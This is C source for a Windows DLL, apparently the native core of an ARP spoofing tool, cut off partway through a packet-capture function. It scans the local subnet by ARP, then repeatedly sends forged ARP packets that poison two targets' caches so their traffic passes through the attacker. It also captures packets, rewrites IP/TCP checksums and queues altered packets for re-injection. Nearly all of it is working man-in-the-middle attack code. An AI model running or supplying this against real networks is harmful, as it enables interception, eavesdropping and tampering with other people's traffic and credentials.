// ARPSpoof.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <stdio.h>
#include <pcap.h>
#include <windows.h>
#include <Winsock2.h>
#include <iphlpapi.h>
#include <stdint.h>

#pragma warning(disable:4996) 

#define TCP_PROTOCOL_NUM 0x06

#define AF_PACKET 17
#define ETH_P_ALL 3
#define BUF_SIZE 60

#define MAX_PACKET_SIZE 150

#define ETH_P_ARP 0x0806

#define WORKING_BUFFER_SIZE 15000
#define MAX_TRIES 3

typedef int bool;
#define true 1
#define false 0
char* itoa(int i, char b[]);

void iptos(u_long in);
DWORD WINAPI CapturePackets(LPVOID lpParam);
DWORD WINAPI SendPackets(LPVOID lpParam);
void* HandleARPReplies(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void HandleARPRepliesNew(u_char *args, const u_char *packet);
bool AreEqual(char * first, char * second);

#define HOST_LIST_SIZE 255*4

typedef struct host_list {
	unsigned char ips[200]; /* list of ip addresses */
	unsigned char macs[400];
	int host_count; /* current num of addresses */
}host_list;

host_list* host_l;

typedef struct Handle {
	pcap_t *adhandle;
	pcap_if_t *d;
	struct sockaddr *netmask;
	u_char * isAttack;
}Handle;

typedef struct ConnectionInfo {
	int isConnected;
	unsigned char name[50];
	unsigned char description[50];
	unsigned char friendlyName[50];
	unsigned char IPAddress[4];
	unsigned char MACAddress[6];
	unsigned char defaultGateway[4];
	unsigned char subnetMask[4];
	unsigned char hosts[200];
	int hostCount;
	int routingEnabled;
	int sleepInterval;
}ConnectionInfo;

typedef struct SendPacketStruct {
	unsigned char packet[MAX_PACKET_SIZE];
	int size;
}SendPacketStruct;

typedef struct ARPSpoofParticipantsInfo {
	unsigned char name[50];
	unsigned char MyIPAddress[4];
	unsigned char MyMACAddress[6];
	unsigned char Target1IPAddress[4];
	unsigned char Target1MACAddress[6];
	unsigned char Target2IPAddress[4];
	unsigned char Target2MACAddress[6];
}ARPSpoofParticipantsInfo;

unsigned char target1[4];
unsigned char target2[4];
unsigned char myAddress[4];

unsigned char target1MAC[6];
unsigned char target2MAC[6];
unsigned char myMAC[6];

#define PROTO_ARP 0x0806
#define ETH2_HEADER_LEN 14
#define HW_TYPE 1
#define PROTOCOL_TYPE 0x800
#define MAC_LENGTH 0x6
#define IPV4_LENGTH 0x4
#define ARP_REQUEST 0x01
#define ARP_REPLY 0x02
#define BUF_SIZE 60
#define ETH_P_IP 0x0800

#define ETHER_ADDR_LEN	6
#define SIZE_ETHERNET 14

#define MAX_HOSTS 50

#define MAX_NUM_OF_PACKETS 100
#define NUM_OF_PACKETS 20

typedef struct arp_header {
	unsigned short hardware_type;
	unsigned short protocol_type;
	unsigned char hardware_len;
	unsigned char  protocol_len;
	unsigned short opcode;
	unsigned char sender_mac[MAC_LENGTH];
	unsigned char sender_ip[IPV4_LENGTH];
	unsigned char target_mac[MAC_LENGTH];
	unsigned char target_ip[IPV4_LENGTH];
}arp_header;

typedef struct ethernet_header {
	unsigned char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
	unsigned char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
	unsigned short ether_type; /* IP? ARP? RARP? etc */
}ethernet_header;

typedef struct tcp_header {
	unsigned short source_port;
	unsigned short dest_port;
	unsigned int sequence;
	unsigned int ack_num;
	unsigned short len_flags;
	unsigned short window;
	unsigned short checksum;
	unsigned short urgent_ptr;
}tcp_header;

typedef struct ip_header {
	unsigned char version_len;
	unsigned char service;
	unsigned short length;
	unsigned short identification;
	unsigned short flags_fragm;
	unsigned char time_to_live;
	unsigned char protocol;
	unsigned short header_checksum;
	unsigned char source_addr[4];
	unsigned char dest_addr[4];
}ip_header;

typedef struct IP_Header {
#if __BYTE_ORDER__ == __LITTLE_ENDIAN__
	uint8_t ip_hdr_len : 4;   /* header length */
	uint8_t ip_version : 4;   /* ip version */
#else
	uint8_t ip_version : 4;   /* ip version */
	uint8_t ip_hdr_len : 4;   /* The IP header length */
#endif

	uint8_t ip_tos;      /* type of service */
	uint16_t ip_len;     /* total length */
	uint16_t ip_id;      /* identification */
	uint16_t ip_off;     /* fragment offset field */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
	uint8_t  ip_ttl;     /* time to live */
	uint8_t  ip_p;       /* protocol */
	uint16_t ip_sum;     /* checksum */
	struct in_addr ip_src, ip_dst;   /* source and dest address */
} IP_Header;

typedef struct TCP_Header {
	uint16_t tcp_source_port; /* source port */
	uint16_t tcp_dest_port; /* destination port */
	uint32_t tcp_seq; /* sequence */
	uint32_t tcp_ack; /* acknowledgement number */
	uint8_t tcp_offest; /* data offset */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
	uint8_t tcp_flags; /* flags */
#define TH_FIN      0x01
#define TH_SYN      0x02
#define TH_RST      0x04
#define TH_PUSH     0x08
#define TH_ACK      0x10
#define TH_URG      0x20
#define TH_ECE      0x40
#define TH_CWR      0x80

#define TH_NS       0x100
#define TH_RS       0xE00

	uint16_t tcp_window; /* window */
	uint16_t tcp_sum; /* checksum */
	uint16_t tcp_urp; /* urgent pointer */
}TCP_Header;

typedef struct TCP_Pseudo {
	struct in_addr src_ip; /* source ip */
	struct in_addr dest_ip; /* destination ip */
	uint8_t zeroes; /* = 0 */
	uint8_t protocol; /* = 6 */
	uint16_t len; /* length of TCPHeader */
} TCP_Pseudo;

struct tcp_pseudo /*the tcp pseudo header*/
{
	unsigned int src_addr;
	unsigned int dst_addr;
	unsigned char zero;
	unsigned char proto;
	unsigned short length;
} pseudohead;

int terminate = 0;

HANDLE ghMutex;

typedef struct Packet {
	unsigned char source_addr[4];
	unsigned char packet[1000];
	unsigned int dataOffset;
	unsigned int dataLength;
	unsigned int size;
}Packet;

struct Packet packets[MAX_NUM_OF_PACKETS];
int front = 0;
int rear = -1;
int itemCount = 0;

bool IsEmpty() {
	return itemCount == 0;
}

bool IsFull() {
	return itemCount == MAX_NUM_OF_PACKETS;
}

int Size() {
	return itemCount;
}

CRITICAL_SECTION critSec;

void Insert(Packet data) {

	EnterCriticalSection(&critSec);
	if (!IsFull()) {

		if (rear == MAX_NUM_OF_PACKETS - 1) {
			rear = -1;
		}

		packets[++rear] = data;
		itemCount++;
	}
	LeaveCriticalSection(&critSec);
}

Packet RemoveData() {

	EnterCriticalSection(&critSec);
	Packet data = packets[front++];

	if (front == MAX_NUM_OF_PACKETS) {
		front = 0;
	}

	itemCount--;
	LeaveCriticalSection(&critSec);

	return data;
}

//*****************************************************************
Packet packetsQueue[MAX_NUM_OF_PACKETS];
int frontPacket = 0;
int rearPacket = -1;
int packetCount = 0;

bool IsPacketQueueEmpty() {
	return packetCount == 0;
}

bool IsPacketQueueFull() {
	return packetCount == MAX_NUM_OF_PACKETS;
}

int PacketQueueSize() {
	return packetCount;
}

CRITICAL_SECTION packetCritSec;

void InsertPacket(Packet data) {

	//EnterCriticalSection(&packetCritSec);
	if (!IsPacketQueueFull()) {

		if (rearPacket == MAX_NUM_OF_PACKETS - 1) {
			rearPacket = -1;
		}

		packetsQueue[++rearPacket] = data;
		packetCount++;
	}
	//LeaveCriticalSection(&packetCritSec);
}

Packet RemovePacket() {

	//EnterCriticalSection(&packetCritSec);
	Packet data = packetsQueue[frontPacket++];

	if (frontPacket == MAX_NUM_OF_PACKETS) {
		frontPacket = 0;
	}

	packetCount--;
	//LeaveCriticalSection(&packetCritSec);

	return data;
}

void InitCriticalSection() {
	InitializeCriticalSection(&critSec);
	InitializeCriticalSection(&packetCritSec);
}

unsigned long Calculate_TCP_Checksum(unsigned short *addr, unsigned int count)
{
	register long sum = 0;

	while (count > 1) {
		/*  This is the inner loop */
		unsigned short temp = *addr++;
		sum += temp;
		count -= 2;
	}
	/*  Add left-over byte, if any */
	if (count > 0)
		sum += *(unsigned char *)addr;

	/*  Fold 32-bit sum to 16 bits */
	while (sum >> 16)
		sum = (sum & 0x0000ffff) + (sum >> 16);

	unsigned short invertedSum = (short)(~sum);

	return invertedSum;
}

long get_my_tcp_checksum(struct ip_header * myip, struct tcp_header * mytcp, char* data) {

	unsigned short total_len = ntohs(myip->length);

	unsigned short temp = (mytcp->len_flags << 8);
	unsigned char tcp_header_len = (temp >> 12);

	unsigned int tcpopt_len = tcp_header_len * 4 - 20;
	unsigned char tempLen = (myip->version_len << 4);
	unsigned char ip_header_len = (tempLen >> 4);
	unsigned int tcpdatalen = total_len - (tcp_header_len * 4) - (ip_header_len * 4);

	pseudohead.src_addr = *(int*)myip->source_addr;
	pseudohead.dst_addr = *(int*)myip->dest_addr;
	pseudohead.zero = 0;
	pseudohead.proto = 0x06;
	pseudohead.length = htons(tcp_header_len*4 + tcpdatalen);

	unsigned int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(tcp_header) + tcpopt_len + tcpdatalen;
	unsigned short * tcp = (short*)malloc(totaltcp_len);

	memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)mytcp, sizeof(tcp_header));
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo) + sizeof(tcp_header), (unsigned char *)myip + (ip_header_len * 4) + (sizeof(tcp_header)), tcpopt_len);
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo) + sizeof(tcp_header) + tcpopt_len, (unsigned char *)data, tcpdatalen);

	unsigned long checksum = Calculate_TCP_Checksum(tcp, totaltcp_len);

	free(tcp);

	return checksum;
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void RetreivePackets(Packet* packet)
	{
		EnterCriticalSection(&critSec);

		if (itemCount != 0) {
			*packet = RemoveData();
		}

		LeaveCriticalSection(&critSec);
	}

	__declspec(dllexport) void Terminate(ARPSpoofParticipantsInfo* arpSpoofParticipantsInfo)
	{
		terminate = 1;

		pcap_t *adhandle;
		unsigned char buffer1[BUF_SIZE];
		unsigned char buffer2[BUF_SIZE];
		char errbuf[PCAP_ERRBUF_SIZE];
		char source[PCAP_ERRBUF_SIZE + 1];
		pcap_if_t *alldevs;
		pcap_if_t *d;

		memset(buffer1, 0x00, 42);
		memset(buffer2, 0x00, 42);

		ethernet_header *send_req1 = (struct ethernet_header *)buffer1;
		struct arp_header *arp_req1 = (struct arp_header *)(buffer1 + ETH2_HEADER_LEN);
		ethernet_header *send_req2 = (struct ethernet_header *)buffer2;
		struct arp_header *arp_req2 = (struct arp_header *)(buffer2 + ETH2_HEADER_LEN);

		send_req2->ether_type = send_req1->ether_type = htons(ETH_P_ARP);

		arp_req2->hardware_type = arp_req1->hardware_type = htons(HW_TYPE);
		arp_req2->protocol_type = arp_req1->protocol_type = htons(ETH_P_IP);
		arp_req2->hardware_len = arp_req1->hardware_len = MAC_LENGTH;
		arp_req2->protocol_len = arp_req1->protocol_len = IPV4_LENGTH;
		arp_req2->opcode = arp_req1->opcode = htons(ARP_REPLY);

		for (int i = 0; i < 4; i++) {
			arp_req1->sender_ip[i] = arpSpoofParticipantsInfo->Target2IPAddress[i];
			arp_req1->target_ip[i] = arpSpoofParticipantsInfo->Target1IPAddress[i];

			arp_req2->sender_ip[i] = arpSpoofParticipantsInfo->Target1IPAddress[i];
			arp_req2->target_ip[i] = arpSpoofParticipantsInfo->Target2IPAddress[i];
		}

		for (int i = 0; i < 6; i++) {
			arp_req1->sender_mac[i] = arpSpoofParticipantsInfo->Target2MACAddress[i];
			arp_req1->target_mac[i] = arpSpoofParticipantsInfo->Target1MACAddress[i];
			send_req1->ether_shost[i] = arpSpoofParticipantsInfo->MyMACAddress[i];
			send_req1->ether_dhost[i] = arpSpoofParticipantsInfo->Target1MACAddress[i];

			arp_req2->sender_mac[i] = arpSpoofParticipantsInfo->Target1MACAddress[i];
			arp_req2->target_mac[i] = arpSpoofParticipantsInfo->Target2MACAddress[i];
			send_req2->ether_shost[i] = arpSpoofParticipantsInfo->MyMACAddress[i];
			send_req2->ether_dhost[i] = arpSpoofParticipantsInfo->Target2MACAddress[i];
		}

		int error = 0;
		for (int i = 0; i < 30; i++) {
			if (pcap_findalldevs_ex(source, NULL, &alldevs, errbuf) == -1)
			{
				fprintf(stderr, "Error in pcap_findalldevs in terminate: %s\n", errbuf);
				error = 1;
				continue;
			}
			else {
				error = 0;
				break;
			}
		}
		if (error) {
			return;
		}

		char realName[50];
		d = alldevs;

		while (1) {
			int i = 0;
			int j = 0;
			while (1) {
				if (d->name[i] != '{') {
					i++;
					continue;
				}

				while (d->name[i] != '}') {
					realName[j] = d->name[i];
					i++;
					j++;
				}

				realName[j] = d->name[i];
				realName[++j] = '\0';
				break;
			}

			if (*realName == *arpSpoofParticipantsInfo->name) {
				break;
			}
			d = d->next;
		}

		if ((adhandle = pcap_open(d->name,          // name of the device
			65536,            // portion of the packet to capture. 
							  // 65536 guarantees that the whole packet will be captured on all the link layers
			PCAP_OPENFLAG_PROMISCUOUS,    // promiscuous mode
			1000,             // read timeout
			NULL,             // authentication on the remote machine
			errbuf            // error buffer
		)) == NULL)
		{
			fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return 0;
		}

		for (int i = 0; i < 10; i++) {
			printf("Terminate loop\n");

			if (pcap_sendpacket(adhandle, buffer1, 42 /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
				return 0;
			}

			if (pcap_sendpacket(adhandle, buffer2, 42 /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
				return 0;
			}

			Sleep(50);
		}
	}
	__declspec(dllexport) int SniffForHosts(ConnectionInfo* connectionInfo)
	{
		InitCriticalSection();

		pcap_t *adhandle;
		unsigned char buffer[BUF_SIZE];
		char errbuf[PCAP_ERRBUF_SIZE];
		char source[PCAP_ERRBUF_SIZE + 1];
		pcap_if_t *alldevs;
		pcap_if_t *d;

		memset(buffer, 0x00, 60);

		int subnetLevel = 0;
		for (int i = 3; i > 0; i--) {
			if (connectionInfo->subnetMask[i] == 0) {
				subnetLevel++;
			}
		}

		if (subnetLevel > 2) {
			return 0;
		}

		int error = 0;
		for (int i = 0; i < 30; i++) {
			if (pcap_findalldevs_ex(source, NULL, &alldevs, errbuf) == -1)
			{
				error = 1;
				continue;
			}
			else {
				error = 0;
				break;
			}
		}
		if (error) {
			fprintf(stderr, "Error in pcap_findalldevs in sniff for hosts: %s\n", errbuf);
			return;
		}

		char realName[50];
		d = alldevs;

		while (1) {
			int i = 0;
			int j = 0;
			while (1) {
				if (d->name[i] != '{') {
					i++;
					continue;
				}

				while (d->name[i] != '}') {
					realName[j] = d->name[i];
					i++;
					j++;
				}

				realName[j] = d->name[i];
				realName[++j] = '\0';
				break;
			}

			if (*realName == *connectionInfo->name) {
				break;
			}
			d = d->next;
		}

		if ((adhandle = pcap_open(d->name,          // name of the device
			65536,            // portion of the packet to capture. 
							  // 65536 guarantees that the whole packet will be captured on all the link layers
			PCAP_OPENFLAG_PROMISCUOUS,    // promiscuous mode
			1000,             // read timeout
			NULL,             // authentication on the remote machine
			errbuf            // error buffer
		)) == NULL)
		{
			fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return 0;
		}

		host_l = (host_list*)malloc(sizeof(host_list));
		host_l->host_count = 0;

		DWORD ClientThreadId;
		Handle* scanForHosts = (Handle*)malloc(sizeof(Handle));
		scanForHosts->adhandle = adhandle;
		scanForHosts->d = d;

		scanForHosts->netmask = (struct sockaddr *)malloc(sizeof(struct sockaddr));
		((struct sockaddr_in *)scanForHosts->netmask)->sin_addr.S_un.S_un_b.s_b1 = connectionInfo->subnetMask[0];
		((struct sockaddr_in *)scanForHosts->netmask)->sin_addr.S_un.S_un_b.s_b2 = connectionInfo->subnetMask[1];
		((struct sockaddr_in *)scanForHosts->netmask)->sin_addr.S_un.S_un_b.s_b3 = connectionInfo->subnetMask[2];
		((struct sockaddr_in *)scanForHosts->netmask)->sin_addr.S_un.S_un_b.s_b4 = connectionInfo->subnetMask[3];

		scanForHosts->isAttack = (u_short*)malloc(sizeof(int));
		*scanForHosts->isAttack = 0;

		CreateThread(NULL, 0, &CapturePackets, scanForHosts, 0, &ClientThreadId);

		Sleep(500);

		ethernet_header *send_req = (struct ethernet_header *)buffer;
		ethernet_header *rcv_resp = (struct ethernet_header *)buffer;
		struct arp_header *arp_req = (struct arp_header *)(buffer + ETH2_HEADER_LEN);
		struct arp_header *arp_resp = (struct arp_header *)(buffer + ETH2_HEADER_LEN);

		send_req->ether_type = htons(ETH_P_ARP);

		arp_req->hardware_type = htons(HW_TYPE);
		arp_req->protocol_type = htons(ETH_P_IP);
		arp_req->hardware_len = MAC_LENGTH;
		arp_req->protocol_len = IPV4_LENGTH;
		arp_req->opcode = htons(ARP_REQUEST);

		for (int i = 0; i < 4; i++) {
			arp_req->sender_ip[i] = connectionInfo->IPAddress[i];
			arp_req->target_ip[i] = connectionInfo->IPAddress[i];
		}

		for (int i = 0; i < 6; i++) {
			arp_req->sender_mac[i] = connectionInfo->MACAddress[i];
			send_req->ether_shost[i] = connectionInfo->MACAddress[i];
			send_req->ether_dhost[i] = 0xff;
		}

		if (subnetLevel == 1) {

			for (int i = 0; i < 255; i++) {

				arp_req->target_ip[3] = i;
				if (pcap_sendpacket(adhandle, buffer, 42 /* size */) != 0)
				{
					fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
					return 0;
				}
			}
		}

		Sleep(connectionInfo->sleepInterval);
		connectionInfo->hostCount = host_l->host_count;

		int i = 0, j = 0;
		while (host_l->host_count > 0) {
			connectionInfo->hosts[j] = host_l->ips[i];

			int m = 0;

			for (int k = i*7 + 1, m = 0; k < i*7 + 1 + 6; k++, m++) {
				connectionInfo->hosts[k] = host_l->macs[i*6 + m];
			}

			i++;
			j += 7;
			host_l->host_count--;
		}

		//pcap_breakloop(scanForHosts->adhandle);
		pcap_close(scanForHosts->adhandle);

		free(scanForHosts->netmask);
		free(scanForHosts);

		pcap_freealldevs(alldevs);
		return 1;
	}

	__declspec(dllexport) void ARPSpoof(ARPSpoofParticipantsInfo* arpSpoofParticipantsInfo) {

		pcap_t *adhandle;
		unsigned char buffer1[BUF_SIZE];
		unsigned char buffer2[BUF_SIZE];
		char errbuf[PCAP_ERRBUF_SIZE];
		char source[PCAP_ERRBUF_SIZE + 1];
		pcap_if_t *alldevs;
		pcap_if_t *d;

		terminate = 0;

		memset(buffer1, 0x00, 42);
		memset(buffer2, 0x00, 42);

		for (int i = 0; i < 4; i++) {
			target1[i] = arpSpoofParticipantsInfo->Target1IPAddress[i];
			target2[i] = arpSpoofParticipantsInfo->Target2IPAddress[i];
			myAddress[i] = arpSpoofParticipantsInfo->MyMACAddress[i];
		}

		for (int i = 0; i < 6; i++) {
			target1MAC[i] = arpSpoofParticipantsInfo->Target1MACAddress[i];
			target2MAC[i] = arpSpoofParticipantsInfo->Target2MACAddress[i];
			myMAC[i] = arpSpoofParticipantsInfo->MyMACAddress[i];
		}

		int error = 0;
		for (int i = 0; i < 30; i++) {
			if (pcap_findalldevs_ex(source, NULL, &alldevs, errbuf) == -1)
			{
				error = 1;
				continue;
			}
			else {
				error = 0;
				break;
			}
		}
		if (error) {
			fprintf(stderr, "Error in pcap_findalldevs in ARP spoof: %s\n", errbuf);
			return;
		}

		char realName[50];
		d = alldevs;

		while (1) {
			int i = 0;
			int j = 0;
			while (1) {
				if (d->name[i] != '{') {
					i++;
					continue;
				}

				while (d->name[i] != '}') {
					realName[j] = d->name[i];
					i++;
					j++;
				}

				realName[j] = d->name[i];
				realName[++j] = '\0';
				break;
			}

			if (*realName == *arpSpoofParticipantsInfo->name) {
				break;
			}
			d = d->next;
		}

		if ((adhandle = pcap_open(d->name,          // name of the device
			65536,            // portion of the packet to capture. 
							  // 65536 guarantees that the whole packet will be captured on all the link layers
			PCAP_OPENFLAG_PROMISCUOUS,    // promiscuous mode
			1000,             // read timeout
			NULL,             // authentication on the remote machine
			errbuf            // error buffer
		)) == NULL)
		{
			fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return 0;
		}

		DWORD CapturePacketsId;
		DWORD SendPacketsId;
		Handle* scanForHosts = (Handle*)malloc(sizeof(Handle));
		scanForHosts->adhandle = adhandle;
		scanForHosts->d = d;

		scanForHosts->isAttack = (u_short*)malloc(sizeof(int));
		*scanForHosts->isAttack = 1;

		printf("ARP spoof\n");
		CreateThread(NULL, 0, &CapturePackets, scanForHosts, 0, &CapturePacketsId);
		CreateThread(NULL, 0, &SendPackets, adhandle, 0, &SendPacketsId);

		Sleep(500);

		ethernet_header *send_req1 = (struct ethernet_header *)buffer1;
		struct arp_header *arp_req1 = (struct arp_header *)(buffer1 + ETH2_HEADER_LEN);
		ethernet_header *send_req2 = (struct ethernet_header *)buffer2;
		struct arp_header *arp_req2 = (struct arp_header *)(buffer2 + ETH2_HEADER_LEN);

		send_req2->ether_type = send_req1->ether_type = htons(ETH_P_ARP);

		arp_req2->hardware_type = arp_req1->hardware_type = htons(HW_TYPE);
		arp_req2->protocol_type = arp_req1->protocol_type = htons(ETH_P_IP);
		arp_req2->hardware_len = arp_req1->hardware_len = MAC_LENGTH;
		arp_req2->protocol_len = arp_req1->protocol_len = IPV4_LENGTH;
		arp_req2->opcode = arp_req1->opcode = htons(ARP_REQUEST);

		for (int i = 0; i < 4; i++) {
			arp_req1->sender_ip[i] = arpSpoofParticipantsInfo->Target2IPAddress[i];
			arp_req1->target_ip[i] = arpSpoofParticipantsInfo->Target1IPAddress[i];

			arp_req2->sender_ip[i] = arpSpoofParticipantsInfo->Target1IPAddress[i];
			arp_req2->target_ip[i] = arpSpoofParticipantsInfo->Target2IPAddress[i];
		}

		for (int i = 0; i < 6; i++) {
			arp_req1->sender_mac[i] = arpSpoofParticipantsInfo->MyMACAddress[i];
			arp_req1->target_mac[i] = arpSpoofParticipantsInfo->Target1MACAddress[i];
			send_req1->ether_shost[i] = arpSpoofParticipantsInfo->MyMACAddress[i];
			send_req1->ether_dhost[i] = arpSpoofParticipantsInfo->Target1MACAddress[i];

			arp_req2->sender_mac[i] = arpSpoofParticipantsInfo->MyMACAddress[i];
			arp_req2->target_mac[i] = arpSpoofParticipantsInfo->Target2MACAddress[i];
			send_req2->ether_shost[i] = arpSpoofParticipantsInfo->MyMACAddress[i];
			send_req2->ether_dhost[i] = arpSpoofParticipantsInfo->Target2MACAddress[i];
		}

		while (terminate != 1) {
			if (pcap_sendpacket(adhandle, buffer1, 42 /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
				//return 0;
			}

			if (pcap_sendpacket(adhandle, buffer2, 42 /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
				//return 0;
			}

			Sleep(50);
		}

		//pcap_breakloop(scanForHosts->adhandle);
		pcap_close(scanForHosts->adhandle);

		free(scanForHosts);
	}

	__declspec(dllexport) void PreparePacketForSending(Packet* packet)
	{
		unsigned int ethernet_header_len = sizeof(ethernet_header);
		struct ip_header *ip = (struct ip_header*)(packet->packet + ethernet_header_len);

		char ip_header_len = ip->version_len << 4;
		ip_header_len = (ip_header_len >> 4) * 4;
		ip->header_checksum = 0;

		unsigned short * ip_array = (short*)malloc(sizeof(ip_header));
		memcpy((unsigned char *)ip_array, (packet->packet + ethernet_header_len), ip_header_len);

		ip->header_checksum = Calculate_TCP_Checksum(ip_array, ip_header_len);

		struct tcp_header *tcp = (struct tcp_header*)(packet->packet + ethernet_header_len + ip_header_len);

		tcp->checksum = 0;

		unsigned short temp = (tcp->len_flags << 8);
		unsigned char tcp_header_len = (temp >> 12) * 4;

		char* data = packet->packet + ethernet_header_len + ip_header_len + tcp_header_len;
		tcp->checksum = get_my_tcp_checksum(ip, tcp, data);

		InsertPacket(*packet);
	}

	__declspec(dllexport) void GetNetworkInfo(ConnectionInfo* info) {

		ULONG outBufLen = 0;
		PIP_ADAPTER_ADDRESSES pAddresses = NULL;
		PIP_ADAPTER_ADDRESSES currentAddress = NULL;
		DWORD dwRetVal = 0;

		// Set the flags to pass to GetAdaptersAddresses
		ULONG flags = GAA_FLAG_INCLUDE_PREFIX;

		// default to unspecified address family (both)
		ULONG family = AF_UNSPEC;
		ULONG Iterations = 0;

		outBufLen = WORKING_BUFFER_SIZE;

		pAddresses = (IP_ADAPTER_ADDRESSES *)malloc(outBufLen);
		if (pAddresses == NULL) {
			printf
			("Memory allocation failed for IP_ADAPTER_ADDRESSES struct\n");
			return;
			//exit(1);
		}

		dwRetVal = GetAdaptersAddresses(family, flags, NULL, pAddresses, &outBufLen);

		if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
			free(pAddresses);
			info->isConnected = 0;
		}

		currentAddress = pAddresses;
		while (currentAddress != NULL) {
			if (currentAddress->OperStatus == 1 && (currentAddress->IfType == IF_TYPE_IEEE80211 || currentAddress->IfType == IF_TYPE_ETHERNET_CSMACD)) {

				info->isConnected = 1;

				int i = 0;
				while (currentAddress->AdapterName[i] != '\0') {

					info->name[i] = currentAddress->AdapterName[i];
					i++;
				}
				info->name[i] = '\0';

				i = 0;
				while (currentAddress->Description[i] != '\0') {

					info->description[i] = currentAddress->Description[i];
					i++;
				}
				info->description[i] = '\0';

				i = 0;
				while (currentAddress->FriendlyName[i] != '\0') {

					info->friendlyName[i] = currentAddress->FriendlyName[i];
					i++;
				}
				info->friendlyName[i] = '\0';

				i = 0;
				while (currentAddress->PhysicalAddress[i] != '\0') {

					info->MACAddress[i] = currentAddress->PhysicalAddress[i];
					i++;
				}
				info->MACAddress[i] = '\0';

				pcap_if_t *alldevs;
				pcap_if_t *d;
				pcap_addr_t *a;
				pcap_t *adhandle;
				char errbuf[PCAP_ERRBUF_SIZE];
				char source[PCAP_ERRBUF_SIZE + 1];
				char * realName = (char *)malloc(50);

				int error = 0;
				for (int i = 0; i < 30; i++) {
					if (pcap_findalldevs_ex(source, NULL, &alldevs, errbuf) == -1)
					{
						fprintf(stderr, "Error in pcap_findalldevs in get network info: %s\n", errbuf);
						error = 1;
						continue;
					}
					else {
						error = 0;
						break;
					}
				}
				if (error) {
					return;
				}

				d = alldevs;
				while (d != NULL) {
					i = 0;
					int j = 0;
					while (1) {
						if (d->name[i] != '{') {
							i++;
							continue;
						}

						while (d->name[i] != '}') {
							realName[j] = d->name[i];
							i++;
							j++;
						}

						realName[j] = d->name[i];
						realName[++j] = '\0';
						break;
					}

					if (!(*currentAddress->AdapterName == *realName)) {
						d = d->next;
						continue;
					}
					break;
				}

				for (a = d->addresses; a; a = a->next)
				{
					if (a != NULL) {
						switch (a->addr->sa_family)
						{
							case AF_INET:
								info->IPAddress[0] = ((struct sockaddr_in *)a->addr)->sin_addr.S_un.S_un_b.s_b1;
								info->IPAddress[1] = ((struct sockaddr_in *)a->addr)->sin_addr.S_un.S_un_b.s_b2;
								info->IPAddress[2] = ((struct sockaddr_in *)a->addr)->sin_addr.S_un.S_un_b.s_b3;
								info->IPAddress[3] = ((struct sockaddr_in *)a->addr)->sin_addr.S_un.S_un_b.s_b4;
						}

						info->subnetMask[0] = ((struct sockaddr_in *)a->netmask)->sin_addr.S_un.S_un_b.s_b1;
						info->subnetMask[1] = ((struct sockaddr_in *)a->netmask)->sin_addr.S_un.S_un_b.s_b2;
						info->subnetMask[2] = ((struct sockaddr_in *)a->netmask)->sin_addr.S_un.S_un_b.s_b3;
						info->subnetMask[3] = ((struct sockaddr_in *)a->netmask)->sin_addr.S_un.S_un_b.s_b4;
					}
				}

				free(realName);
				return;
			}

			currentAddress = currentAddress->Next;
		}

		free(pAddresses);
		info->isConnected = 0;
	}

	char* itoa(int i, char b[]) {
		char const digit[] = "0123456789";
		char* p = b;
		if (i<0) {
			*p++ = '-';
			i *= -1;
		}
		int shifter = i;
		do { //Move to where representation ends
			++p;
			shifter = shifter / 10;
		} while (shifter);
		*p = '\0';
		do { //Move back, inserting digits as u go
			*--p = digit[i % 10];
			i = i / 10;
		} while (i);
		return b;
	}

	short ReverseEndian(char* data, int len) {

		char* temp = (char*)malloc(len);
		for (int i = 0, j = len-1; i < len; i++, j--) {
			temp[i] = data[j];
		}

		short retVal = *(short*)temp;
		free(temp);

		return retVal;
	}

	bool AreEqual(char * first, char * second) {

		int i = 0;
		
		while (first[i] != '\0' && second[i] != '\0') {
			if (first[i] != second[i]) {
				return false;
			}
			i++;
		}

		if (first[i] != second[i]) {
			return false;
		}
		else {
			return true;
		}
	}

	bool AreAdressesEqual(char * first, char * second) {

		for (int i = 0; i < 4; i++) {
			if (first[i] != second[i]) {
				return false;
			}
		}

		return true;
	}

	bool AreMACAdressesEqual(char * first, char * second) {

		for (int i = 0; i < 6; i++) {
			if (first[i] != second[i]) {
				return false;
			}
		}

		return true;
	}

#define IPTOSBUFFERS 12
	void iptos(u_long in)
	{
		u_char *p;

		p = (u_char *)&in;
		printf("%d.%d.%d.%d\n", p[0], p[1], p[2], p[3]);
	}

	DWORD WINAPI CapturePackets(LPVOID lpParam)
	{
		struct bpf_program fp;		/* The compiled filter expression */
		Handle *scanForHosts = (Handle*)lpParam;

		printf("Arg: %d\n", *scanForHosts->isAttack);

		if (pcap_datalink(scanForHosts->adhandle) != DLT_EN10MB) {
			fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", scanForHosts->d);
			return(2);
		}
		if (*scanForHosts->isAttack != 1) {
			char filter_exp[] = "arp";	/* The filter expression */

